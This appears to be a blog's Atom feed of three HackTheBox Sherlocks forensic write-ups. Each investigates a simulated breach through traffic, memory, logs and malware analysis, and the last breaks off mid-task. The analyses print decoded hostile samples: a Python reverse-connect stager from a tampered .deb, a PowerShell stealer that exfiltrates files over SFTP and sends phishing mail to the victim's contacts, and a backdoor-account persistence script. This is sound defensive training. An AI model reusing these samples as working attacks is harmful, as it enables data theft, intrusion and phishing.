<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xor37.github.io</id>
    <title>李西瓜🍉</title>
    <updated>2024-08-16T06:21:02.449Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://xor37.github.io"/>
    <link rel="self" href="https://xor37.github.io/atom.xml"/>
    <subtitle>喜欢就买 不行就分 多喝热水 少刷视频</subtitle>
    <logo>https://xor37.github.io/images/avatar.png</logo>
    <icon>https://xor37.github.io/favicon.ico</icon>
    <rights>All rights reserved 2024, 李西瓜🍉</rights>
    <entry>
        <title type="html"><![CDATA[HackTheBox Sherlocks APTNightmare]]></title>
        <id>https://xor37.github.io/post/hackthebox-sherlocks-aptnightmare/</id>
        <link href="https://xor37.github.io/post/hackthebox-sherlocks-aptnightmare/">
        </link>
        <updated>2024-08-16T06:06:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>公司内突然出现了多封恶意电子邮件，我们需要调查整个事件的前因后果。包括流量分析、内存分析、日志分析、病毒分析。</p>
<h2 id="背景">背景</h2>
<blockquote>
<p>We neglected to prioritize the robust security of our network and servers, and as a result, both our organization and our customers have fallen victim to a cyber attack. The origin and methods of this breach remain unknown. Numerous suspicious emails have been detected. In our pursuit of resolution, As an expert forensics investigator, you must be able to help us.</p>
</blockquote>
<h2 id="文件">文件</h2>
<ul>
<li>traffic.pcapng ：Web 服务器流量。</li>
<li>Memory_WebServer.mem ：Web 服务器内存转储。</li>
<li>DiskImage_CEO-US.zip：  CEO 计算机 C 盘的克隆。</li>
<li>Ubuntu_5.3.0-70-generic_profile.zip ：包含 Ubuntu 计算机中的/boot和/tools文件夹</li>
</ul>
<h2 id="task-1">Task 1</h2>
<blockquote>
<p>What is the IP address of the infected web server?</p>
</blockquote>
<p>最活跃的就是 192.168.1.5 与 192.168.1.3<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814110201.png" alt="" loading="lazy"><br>
看过协议分析了，HTTP 流量居多。先看一下 HTTP 请求，马上发现异常请求，定位到攻击行为。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814104532.png" alt="" loading="lazy"><br>
搜索关键字很快就能定位到。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814105133.png" alt="" loading="lazy"></p>
<h2 id="task-2">Task 2</h2>
<blockquote>
<p>What is the IP address of the Attacker?</p>
</blockquote>
<figure data-type="image" tabindex="1"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814105133.png" alt="" loading="lazy"></figure>
<h2 id="task-3">Task 3</h2>
<p>服务端短时间内向向攻击者发送了很多 RST/ACK 包，攻击者可能在进行 SYN 扫描。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814111956.png" alt="" loading="lazy"><br>
通过服务端回复 ACK 的情况就能判断端口是否开放。</p>
<pre><code class="language-bash">ip.dst == 192.168.1.5 &amp;&amp; ip.src == 192.168.1.3 &amp;&amp; tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 1
</code></pre>
<p>过滤后导出至 CSV<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814112325.png" alt="" loading="lazy"><br>
数据处理就交给 AI 吧<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814113544.png" alt="" loading="lazy"></p>
<h2 id="task-4">Task 4</h2>
<blockquote>
<p>What are the first five ports identified by the attacker in numerical order during the enumeration phase, not considering the sequence of their discovery?</p>
</blockquote>
<p>奇怪的问题，就是按顺序数前五个端口。</p>
<h2 id="task-5">Task 5</h2>
<blockquote>
<p>The attacker exploited a misconfiguration allowing them to enumerate all subdomains. This misconfiguration is commonly referred to as (e.g, Unrestricted Access Controls)?</p>
</blockquote>
<p>能枚举所有子域名的应该是区域传输，在数据包里也发现了这样的流量。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814114113.png" alt="" loading="lazy"></p>
<h2 id="task-6">Task 6</h2>
<blockquote>
<p>How many subdomains were discovered by the attacker?</p>
</blockquote>
<p>找到区域传输的数据包，数一下 A 记录。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814114257.png" alt="" loading="lazy"></p>
<h2 id="task-7">Task 7</h2>
<blockquote>
<p>What is the compromised subdomain (e.g., dev.example.com) ?</p>
</blockquote>
<p>找到攻击的包，查看 Origin。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814114524.png" alt="" loading="lazy"></p>
<h2 id="task-8">Task 8</h2>
<blockquote>
<p>What email address and password were used to log in (e.g., user@example.com:password123)?</p>
</blockquote>
<p>攻击者一直在请求 index.php，从请求内容看也是在爆破密码。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814115706.png" alt="" loading="lazy"><br>
只需要找到不是 index.php 的时候，证明他可能登陆成功了。</p>
<pre><code class="language-bash">ip.addr == 192.168.1.5 &amp;&amp; ip.addr == 192.168.1.3 &amp;&amp; http.request &amp;&amp;http.host == &quot;sysmon.cs-corp.cd&quot; &amp;&amp; !http.request.uri contains &quot;index.php&quot;
</code></pre>
<p><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814134022.png" alt="" loading="lazy"><br>
跟踪流可以看到正确的密码<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814134516.png" alt="" loading="lazy"></p>
<h2 id="task-9">Task 9</h2>
<blockquote>
<p>What command gave the attacker their initial access ?</p>
</blockquote>
<p>这里执行完之后，服务器的 5555 端口就跟攻击者建立链接了。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814144614.png" alt="" loading="lazy"></p>
<h2 id="task-10">Task 10</h2>
<blockquote>
<p>What is the CVE identifier for the vulnerability that the attacker exploited to achieve privilege escalation (e.g, CVE-2016-5195) ?</p>
</blockquote>
<p>可以看到使用了 PwnKit.sh 就实现了提权。</p>
<blockquote>
<p>PwnKit.sh 是一个独立的漏洞利用工具，专门针对 CVE-2021-4034 这个漏洞。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814145424.png" alt="" loading="lazy"></p>
</blockquote>
<h2 id="task-11">Task 11</h2>
<blockquote>
<p>What is the MITRE ID of the technique used by the attacker to achieve persistence (e.g, T1098.001)?</p>
</blockquote>
<p>通过 crontab 进行权限维持。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814145727.png" alt="" loading="lazy"></p>
<h2 id="task-12">Task 12</h2>
<blockquote>
<p>The attacker tampered with the software hosted on the 'download' subdomain with the intent of gaining access to end-users. What is the Mitre ATT&amp;CK technique ID for this attack?</p>
</blockquote>
<p>看描述就知道是供应链攻击，T1195.002.</p>
<h2 id="task-13">Task 13</h2>
<blockquote>
<p>What command provided persistence in the cs-linux.deb file?</p>
</blockquote>
<p>先把 cs-linux.deb 导出来，解压，拿到代码。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/2024-08-14%2015.56.41.png" alt="" loading="lazy"></p>
<pre><code class="language-python">#!/usr/bin/env python3

exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eJw9UN9LwzAQfl7+irCHNcEsrqMbOmxBxAcRGTjfRKRNT1uaJiWXaqfo325Dh/dwx3f33Xc/6razzlO0qgEvvnRdiCJH2CYCveuVF75uQVgkxKLEI3po2RxUZanCpa5NP9DFgmYZ/T2XY2Pl1JyTN+voQGtDXW7egcUrviMz746jn2E6zZJTYGtxwof9zf3r4enx9vqBB55U1hhQnrEovlzLeHshY7mJRDIaD4zCQd6QGQwKOh+kw6oSNUDHNpzodLpA9qbLVcOi7C4SKB2oDzYKPK9eSJmesObks6o1UA2GlfxKj3Ll2X91OaU5gQEUC0+SJSjbdg4Q2fQvWWyTkCwhMMV3hNEOfzj5Axx7baM=')[0])))

</code></pre>
<p>解码，可以看到是通过写入 ~/.bashrc 做权限维持的。</p>
<pre><code class="language-python">import socket,zlib,base64,struct,time,os

os.system(&quot;echo cs-linux &amp;&amp; &gt;&gt; ~/.bashrc&quot;)
for x in range(10):
	try:
			s=socket.socket(2,socket.SOCK_STREAM)
			s.connect(('192.168.1.5',4444))
			break
	except:
			time.sleep(5)
l=struct.unpack('&gt;I',s.recv(4))[0]
d=s.recv(l)
while len(d)&lt;l:
        d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
</code></pre>
<h2 id="task-14">Task 14</h2>
<blockquote>
<p>The attacker sent emails to employees, what the name for the running process that allowed this to occur?</p>
</blockquote>
<p>需要分析进程了，这里通过内存转储文件 Memory_WebServer.mem 进行分析。但是 Volatility 一直失败，只能上 strings 大法了。但数据量还是很多，1120w 行的数据没法翻看。<br>
一般 Linux 服务会有一个专属用户用于运行这个进程，比如 nginx 用户。我们可以去流量包里找到之前的 /etc/passwd，有概率可以发现邮件服务是什么。<br>
从后往前了解，citadel 正好就是协同服务，包含邮件服务。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814162723.png" alt="" loading="lazy"><br>
但直接填 citadel 是错误的，估计有服务端？最快的还是问 AI。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814163254.png" alt="" loading="lazy"></p>
<h2 id="task-15">Task 15</h2>
<blockquote>
<p>We received phishing email can you provide subject of email ?</p>
</blockquote>
<figure data-type="image" tabindex="2"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814164020.png" alt="" loading="lazy"></figure>
<h2 id="task-16">Task 16</h2>
<blockquote>
<p>What is the name of the malicious attachment?</p>
</blockquote>
<p>直接搜 attachment 太多了，还是搜主题 Revised Privacy Policy 再找到附件名。</p>
<pre><code class="language-php">Content-disposition: attachment; filename=&quot;policy.docm&quot;
</code></pre>
<h2 id="task-17">Task 17</h2>
<blockquote>
<p>Please identify the usernames of the CEOs who received the attachment.</p>
</blockquote>
<p>这里直接搜索 To: &quot;ceo 没有结果，搜索 From: &quot;ceo 才有结果。可能是收到附件的 CEO 中毒后会自动发恶意邮件给其他人吧。</p>
<h2 id="task-18">Task 18</h2>
<blockquote>
<p>What is the hostname for the compromised CEO?</p>
</blockquote>
<p>主机名应该在 DiskImage_CEO-US.zip 会容易获取。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814165728.png" alt="" loading="lazy"></p>
<h2 id="task-19">Task 19</h2>
<blockquote>
<p>What is the full path for the malicious attachment?</p>
</blockquote>
<p>这里需要变成反斜杠才能提交成功（好坑）<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814170540.png" alt="" loading="lazy"></p>
<h2 id="task-20">Task 20</h2>
<blockquote>
<p>Can you provide the command used to gain initial access?</p>
</blockquote>
<p>Windows 执行命令一般会调用 cmd.exe 或 powershell.exe，但直接搜索查不到。<br>
通过 Windows 日志可以看到，powershell 下载了 http://192.168.1.5:806/a 并执行。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814173354.png" alt="" loading="lazy"></p>
<h2 id="task-21">Task 21</h2>
<blockquote>
<p>Provide a Popular threat label for the malicious executable used to gain initial access?</p>
</blockquote>
<p>要解答这个问题，我需要知道  http://192.168.1.5:806/a 的内容。我们可以在流量包里找到它。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814174633.png" alt="" loading="lazy"><br>
CyberChef 解码一下，看起来具体的 shellcode 是这个被 xor35 处理过的 Base64 字符串。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240814180451.png" alt="" loading="lazy"><br>
CyberChef 解码出错，写个脚本解一下。应该是病毒本体了，扔到 Virustotal 分析一下。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240815102633.png" alt="" loading="lazy"><br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240815102854.png" alt="" loading="lazy"></p>
<h2 id="task-22">Task 22</h2>
<blockquote>
<p>What is the payload type?</p>
</blockquote>
<p>这需要我们对 cs 病毒做样本分析。Google 找到了一个能解析 cs 的脚本 https://isc.sans.edu/diary/Analysis+of+an+Encoded+Cobalt+Strike+Beacon/29014<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240815114209.png" alt="" loading="lazy"></p>
<h2 id="task-23">Task 23</h2>
<blockquote>
<p>What is task name has been add by attacker?</p>
</blockquote>
<p>直接去 C:\Windows\System32\Tasks 下寻找即可，C:\Users\Public 下的 WindowsUpdate.exe 很不正常。应该是攻击者布置的。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240815114640.png" alt="" loading="lazy"><br>
完结撒花 🎉<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/2024-08-15%2011.48.27.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[HackTheBox Heartbreaker-Continuum]]></title>
        <id>https://xor37.github.io/post/hackthebox-heartbreaker-continuum/</id>
        <link href="https://xor37.github.io/post/hackthebox-heartbreaker-continuum/">
        </link>
        <updated>2024-08-13T07:15:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>揭开病毒分析的迷雾，回答官方提出的问题，了解这个病毒的工作原理。</p>
<h2 id="背景">背景</h2>
<blockquote>
<p>Following a recent report of a data breach at their company, the client submitted a potentially malicious executable file. The file originated from a link within a phishing email received by a victim user. Your objective is to analyze the binary to determine its functionality and possible consequences it may have on their network. By analyzing the functionality and potential consequences of this binary, you can gain valuable insights into the scope of the data breach and identify if it facilitated data exfiltration. Understanding the binary's capabilities will enable you to provide the client with a comprehensive report detailing the attack methodology, potential data at risk, and recommended mitigation steps.</p>
</blockquote>
<h2 id="task-1">Task 1</h2>
<blockquote>
<p>To accurately reference and identify the suspicious binary, please provide its SHA256 hash.</p>
</blockquote>
<p>Virustotal 能获取很多关于这个病毒的信息。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813140753.png" alt="" loading="lazy"></p>
<h2 id="task-2">Task 2</h2>
<blockquote>
<p>When was the binary file originally created, according to its metadata (UTC)?</p>
</blockquote>
<figure data-type="image" tabindex="1"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813141115.png" alt="" loading="lazy"></figure>
<h2 id="task-3">Task 3</h2>
<blockquote>
<p>Examining the code size in a binary file can give indications about its functionality. Could you specify the byte size of the code in this binary?</p>
</blockquote>
<figure data-type="image" tabindex="2"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813141315.png" alt="" loading="lazy"></figure>
<h2 id="task-4">Task 4</h2>
<blockquote>
<p>It appears that the binary may have undergone a file conversion process. Could you determine its original filename?</p>
</blockquote>
<figure data-type="image" tabindex="3"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813142636.png" alt="" loading="lazy"></figure>
<h2 id="task-5">Task 5</h2>
<blockquote>
<p>Specify the hexadecimal offset where the obfuscated code of the identified original file begins in the binary.</p>
</blockquote>
<p>这里通过 16 进制编辑器就能看到，现实的病毒可能需要各种逆向分析。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813142952.png" alt="" loading="lazy"></p>
<h2 id="task-6">Task 6</h2>
<blockquote>
<p>The threat actor concealed the plaintext script within the binary. Can you provide the encoding method used for this obfuscation?</p>
</blockquote>
<p>把代码提取出来，可以看到字符翻转、Base64、字符拼接的行为。问的是编码，那就是 Base64 了。<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813143620.png" alt="" loading="lazy"></p>
<h2 id="task-7">Task 7</h2>
<blockquote>
<p>What is the specific cmdlet utilized that was used to initiate file downloads?</p>
</blockquote>
<p>还原上面的恶意代码</p>
<pre><code class="language-bash">$hostname = $env:COMPUTERNAME
$currentUser = $env:USERNAME
$url = &quot;http://44.206.187.144:9000/Superstar_MemberCard.tiff&quot;
$img = &quot;C:\users\$currentUser\Downloads\Superstar_MemberCard.tiff&quot;

Invoke-WebRequest -Uri $url -OutFile $img
Start-Process $img

$searchDir = &quot;C:\Users&quot;
$targetDir = &quot;C:\Users\Public\Public Files&quot;

if (-not (Test-Path -Path $targetDir -PathType Container)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

$currentUser | Out-File -FilePath (Join-Path $targetDir 'username.txt') -Force

nltest /dsgetdc:$env:USERDOMAIN 2&gt;$null | Out-File -FilePath (Join-Path $targetDir 'DCinfo.txt') -Force
Get-WmiObject -Class Win32_UserAccount | Out-File -FilePath (Join-Path $targetDir 'localusers.txt') -Force
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value 2&gt;$null | Out-File -FilePath (Join-Path $targetDir 'AVinfo.txt') -Force

$currentUserProcesses = Get-WmiObject Win32_Process | Where-Object {
    try {
        $_.GetOwner().User -eq $currentUser
    } catch {
        $false  
    }
}

$currentUserProcesses | Select-Object ProcessName, ProcessId | Out-File -FilePath (Join-Path $targetDir 'UserProcesses.txt') -Force

if (Get-Process -Name Outlook -ErrorAction SilentlyContinue) {
    Stop-Process -Name Outlook -Force -ErrorAction SilentlyContinue
}

$extList =  &quot;*.doc&quot;, &quot;*.docx&quot;, &quot;*.xls&quot;, &quot;*.xlsx&quot;, &quot;*.ppt&quot;, &quot;*.pptx&quot;, &quot;*.pdf&quot;, &quot;*.csv&quot;, &quot;.*oft&quot;, &quot;*.potx&quot;, 
            &quot;*.xltx&quot;, &quot;*.dotx&quot;, &quot;*.msg&quot;, &quot;*.eml&quot;, &quot;*.pst&quot;,  &quot;*.odt&quot;, &quot;*.ods&quot;, &quot;*.odp&quot;, &quot;*.odg&quot;, &quot;*.ost&quot;
             
$null = Get-ChildItem $searchDir -Recurse -Include $extList -Force -ErrorAction 'SilentlyContinue' |
    ForEach-Object {
        $destinationPath = Join-Path $targetDir $_.Name
        
        if ($_.FullName -ne $destinationPath) {
            Copy-Item -Path $_.FullName -Destination $destinationPath -Force
        }
    }

Get-SmbShare | Out-File -FilePath (Join-Path $targetDir 'Shareinfo.txt') -Force
gpresult /r | Out-File -FilePath (Join-Path $targetDir 'GPinfo.txt') -Force
$ProgressPreference = 'SilentlyContinue'
$archivePath = &quot;$targetDir\$hostname.zip&quot;
Compress-Archive -Path $targetDir -DestinationPath $archivePath -Force 

$wZipUrl = &quot;https://us.softradar.com/static/products/winscp-portable/distr/0/winscp-portable_softradar-com.zip&quot;
$wZipFile = &quot;$targetDir\WinSCP.zip&quot;
$wExtractPath = &quot;C:\Users\Public\HelpDesk-Tools&quot;

Invoke-WebRequest -UserAgent &quot;Wget&quot; -Uri $wZipUrl -OutFile $wZipFile -UseBasicParsing
Expand-Archive -Path $wZipFile -DestinationPath $wExtractPath -Force

$wExePath = &quot;$wExtractPath\WinSCP.com&quot;
$sPath = &quot;$wExtractPath\maintenanceScript.txt&quot;
@&quot;
open sftp://service:M8&amp;C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
put `&quot;$archivePath`&quot;
close
exit
&quot;@ | Out-File -FilePath $sPath -Force
Start-Process -FilePath $wExePath -ArgumentList &quot;/script=`&quot;$sPath`&quot;&quot; -Wait -NoNewWindow


$outlookPath  = Get-ChildItem -Path &quot;C:\Program Files\Microsoft Office&quot; -Filter &quot;OUTLOOK.EXE&quot; -Recurse | Select-Object -First 1 -ExpandProperty FullName

$htmlBody = @&quot;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;style&gt;
    body {
    font-family: Calibri, sans-serif;
    }
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;p&gt;Hey, &lt;/p&gt; &lt;p&gt; Hope you're doing great when you see this. I'm reaching out because there's something I've been wanting to share with you. You know that feeling when you've been admiring someone from afar, but hesitated to take the next step? That's been me lately, but I've decided it's time to change that.&lt;/p&gt;
&lt;p&gt;In a world where we often rush through everything, I believe in the beauty of taking things slow, cherishing each moment like a scene from a timeless tale. So, if you're open to it, I'd love for us to meet up after hours.&lt;/p&gt;
&lt;p&gt;I've arranged for a rendezvous at a private membership club, where we can enjoy a bit of privacy and exclusivity. I've attached the map for your convenience. &lt;/p&gt;
&lt;p&gt;To gain entry, you'll need a digital membership card for entry, accessible &lt;a href='http://44.206.187.144:9000/Superstar_MemberCard.tiff.exe'&gt;here&lt;/a&gt;. Just a friendly heads up, there's a time limit before you can download it, so it's best to grab it sooner rather than waiting too long.&lt;/p&gt;
&lt;p&gt;Counting on seeing you there later.&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
&quot;@

if ($outlookPath) {
    Start-Process -FilePath $outlookPath
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace(&quot;MAPI&quot;)
    $contactsFolder = $namespace.GetDefaultFolder(10) 
    $csvFilePath = &quot;$targetDir\Contacts.csv&quot;
    $contactsFolder.Items | ForEach-Object {
        $_.GetInspector | ForEach-Object {
            $_.Close(0)  
        }
        $props = @{
            'Full Name'      = $_.FullName
            'Email Address'  = $_.Email1Address
            
        }
        New-Object PSObject -Property $props
    } | Export-Csv -Path $csvFilePath -NoTypeInformation

    $contacts = Import-Csv -Path $csvFilePath
    $mailItem = $outlook.CreateItem(0)
    $mailItem.Subject = &quot;Fingers crossed you'll notice..&quot;
    $mailItem.HtmlBody = $htmlBody
    $mailItem.Attachments.Add($img) &gt; $null
    $mailItem.BodyFormat = 2 

    foreach ($contact in $contacts) {
        $bccRecipient = $mailItem.Recipients.Add($contact.&quot;Email Address&quot;)
        $bccRecipient.Type = [Microsoft.Office.Interop.Outlook.OlMailRecipientType]::olBCC
    }

    $mailItem.Recipients.ResolveAll() &gt; $null
    $mailItem.Send()
}

Remove-Item -Path $wExtractPath -Recurse -Force
Remove-Item -Path $targetDir -Recurse -Force

</code></pre>
<p>可以看到</p>
<pre><code class="language-bash">Invoke-WebRequest -Uri $url -OutFile $img
</code></pre>
<h2 id="task-8">Task 8</h2>
<blockquote>
<p>Could you identify any possible network-related Indicators of Compromise (IoCs) after examining the code? Separate IPs by comma and in ascending order.</p>
</blockquote>
<p>CyberChef 直接提取 IP<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813144437.png" alt="" loading="lazy"></p>
<h2 id="task-9">Task 9</h2>
<blockquote>
<p>The binary created a staging directory. Can you specify the location of this directory where the harvested files are stored?</p>
</blockquote>
<p>阅读恶意代码可知</p>
<pre><code class="language-bash">$targetDir = &quot;C:\Users\Public\Public Files&quot;
</code></pre>
<h2 id="task-10">Task 10</h2>
<blockquote>
<p>What MITRE ID corresponds to the technique used by the malicious binary to autonomously gather data?</p>
</blockquote>
<p>执行恶意代码的时候会自动收集用户的各种信息和文件。根据 https://attack.mitre.org/tactics/TA0009/ 可知是 T1119.</p>
<h2 id="task-11">Task 11</h2>
<blockquote>
<p>What is the password utilized to exfiltrate the collected files through the file transfer program within the binary?</p>
</blockquote>
<pre><code class="language-bash">@&quot;
open sftp://service:M8&amp;C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
put `&quot;$archivePath`&quot;
close
exit
&quot;@ 
</code></pre>
<p>完结撒花<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/%E6%88%AA%E5%B1%8F2024-08-13%2014.55.50.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[HackTheBox Sherlocks - Fragility]]></title>
        <id>https://xor37.github.io/post/hackthebox-sherlocks-fragility/</id>
        <link href="https://xor37.github.io/post/hackthebox-sherlocks-fragility/">
        </link>
        <updated>2024-08-12T09:27:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>应急响应时手忙脚乱， WireShark 技巧都快忘光了。于是想通过 HackTheBox Sherlocks 的靶机当侦探回顾和总结一下应急响应技巧。HackTheBox Sherlocks 模拟各种被攻击的场景，要求根据各种文件分析攻击行为，回答问题。</p>
<p>目前包含一下几种类型：</p>
<ol>
<li>Cloud（云安全）</li>
<li>SOC（安全运营中心）</li>
<li>DFIR（数字取证与事件响应）</li>
<li>Threat Hunting（威胁搜寻）</li>
<li>Threat Intelligence（威胁情报）</li>
<li>Malware Analysis（恶意软件分析）</li>
</ol>
<p>本文是一台 DFIR 靶机<br>
<img src="https://s2.loli.net/2024/08/12/qov6bIVui4NEFRZ.png" alt="Pasted image 20240812171039.png" loading="lazy"></p>
<h2 id="背景">背景</h2>
<blockquote>
<p>In the monitoring team at our company, each member has access to Splunk web UI using an admin Splunk account. Among them, John has full control over the machine that hosts the entire Splunk system. One day, he panicked and reported to us that an important file on his computer had disappeared. Moreover, he also discovered a new account on the login screen. Suspecting this to be the result of an attack, we proceeded to collect some evidence from his computer and also obtained network capture. Can you help us investigate it?</p>
</blockquote>
<h2 id="task-1">Task 1</h2>
<blockquote>
<p>What CVE did the attacker use to exploit the vulnerability?</p>
</blockquote>
<p>通过背景可以知道 Splunk 很重要，也提到了 Splunk web UI，可以先看看。<br>
HTTP 请求的量不大，我们可以翻一下。<br>
<img src="https://s2.loli.net/2024/08/12/2QcrfP3p7sEaGm9.png" alt="Pasted image 20240812172338.png" loading="lazy"><br>
找一个 HTTP 包跟踪数据流，发现了不正常的输入。<br>
<img src="https://s2.loli.net/2024/08/12/35BSR2OGtJXb1lM.png" alt="截屏2024-08-12 11.25.34.png" loading="lazy"><br>
解码后就是：</p>
<pre><code class="language-php">search=|runshellscript+&quot;search.sh&quot;+&quot;&quot;+&quot;&quot;+&quot;&quot;+&quot;&quot;+&quot;&quot;+&quot;&quot;+&quot;&quot;+&quot;1713106812.3&quot;
</code></pre>
<p>Google 搜 splunkd search/jogs cve，就能发现利用的是 CVE-2023-46214.</p>
<blockquote>
<p>Splunk Enterprise 版本9.0.7 和 9.1.2之前，由于未能安全清理用户提供的可扩展样式表语言转换 (XSLT，其中包含将 XML文档转换为HTML、纯文本或 PDF等其他格式的规则)，威胁者可以上传恶意 XSLT文件，从而导致在Splunk Enterprise实例上远程执行代码。</p>
</blockquote>
<h2 id="task-2">Task 2</h2>
<blockquote>
<p>What MITRE technique does the attacker use to maintain persistence?</p>
</blockquote>
<p>要回答这个问题，需要知道 search.xsl 包含的恶意内容<br>
<img src="https://s2.loli.net/2024/08/12/RUAvgDaLKdBlq3H.png" alt="截屏2024-08-12 11.43.45.png" loading="lazy"><br>
整理一下就是这样，可以看到通过加用户和写公钥实现持久化。</p>
<pre><code class="language-bash">#!/bin/bash
adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx
access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)
echo quot;nginx:$accessquot; | chpasswd
usermod -aG sudo nginx
mkdir /var/www/.ssh
echo quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.orgquot; gt; /var/www/.ssh/authorized_keys
chown -R nginx:nginx /var/www/
cat /dev/null gt; /root/.bash_history
</code></pre>
<p>根据 https://attack.mitre.org/tactics/TA0003/ 可以知道是 T1136</p>
<h2 id="task-3">Task 3</h2>
<blockquote>
<p>John has adjusted the timezone but hasn't rebooted the computer yet, which has led to some things either being updated or not updated with the new timezone. Identifying the timezone can assist you further in your investigation. What was the default timezone and the timezone after John's adjustment on this machine?</p>
</blockquote>
<p>这个通过 NTP 的数据包没看出来（知识盲区了可能是）问 AI 各种时区缩写，在日志中发现 PDT（UTC-7）<br>
<img src="https://s2.loli.net/2024/08/12/AmPIN3wuW4sg5or.png" alt="截屏2024-08-12 16.08.40.png" loading="lazy"></p>
<h2 id="task-4">Task 4</h2>
<blockquote>
<p>When did the attacker SSH in? (UTC)</p>
</blockquote>
<p>先改一下时间显示格式<br>
<img src="https://s2.loli.net/2024/08/12/97jlJpUIxcLdVSb.png" alt="Pasted image 20240812151147.png" loading="lazy"><br>
实际上在 04-14 15:00:21 才开始使用 SSH。<br>
